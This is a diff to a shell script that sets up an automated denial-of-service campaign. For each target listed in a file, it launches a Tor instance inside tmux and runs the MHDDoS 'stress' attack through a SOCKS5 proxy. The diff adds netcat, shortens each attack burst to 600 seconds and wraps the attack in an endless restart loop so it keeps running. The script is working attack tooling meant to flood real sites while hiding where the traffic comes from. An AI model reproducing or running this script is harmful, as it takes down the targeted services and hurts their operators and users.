@@ -24,13 +24,14 @@ apt_req=(
   tree
   iftop
   nethogs
+  netcat-openbsd
 )
 mhddos_repo="https://github.com/MHProDev/MHDDoS.git"
 mhddos_dir="${basedir}/mhddos"
 mhddos_socks_type=5
 mhddos_threads=10
 mhddos_rpc=10
-mhddos_duration=36000
+mhddos_duration=600
 mhddos_debug=true
 tmux_session_name="tor"
 
@@ -102,17 +103,17 @@ grep -xv '' ${targets} | grep -v '^#' | while read -r target; do
   tmux new-window -t ${tmux_session_name}:$i -n "" "tor -f ${tor_config}"
   tmux split-window -t ${tmux_session_name}:$i \
     "nyx -i ${tor_host}:${tor_control_port}"
-
-  # Create proxy file for mhddos
-  echo "socks5://${tor_host}:${tor_socks_port}" > ${mhddos_proxy_file}
+  tor_pid=$(ps aux | grep "tor/$i/torrc" | head -1 | awk '{print $2}')
+  tmux split-window -t ${tmux_session_name}:$i \
+    "while true; do ./speed_control.sh ${tor_host} ${tor_socks_port} ${tor_control_port} ${tor_pid}; sleep 600; done"
+  tmux select-layout -t ${tmux_session_name}:$i tiled
 
   # Start target
-
-  command="cd ${mhddos_dir} && env/bin/python start.py stress ${target} \
+  echo "socks5://${tor_host}:${tor_socks_port}" > ${mhddos_proxy_file}
+  command="cd ${mhddos_dir} && trap break SIGINT && while true; do \
+    env/bin/python start.py stress ${target} \
     ${mhddos_socks_type} ${mhddos_threads} $i.txt ${mhddos_rpc} \
-    ${mhddos_duration} ${mhddos_debug}"
+    ${mhddos_duration} ${mhddos_debug}; done"
   tmux split-window -t ${tmux_session_name}:$i "${command}"
-
-  # Set tmux window layout
-  tmux select-layout -t ${tmux_session_name}:$i tiled
 done
+
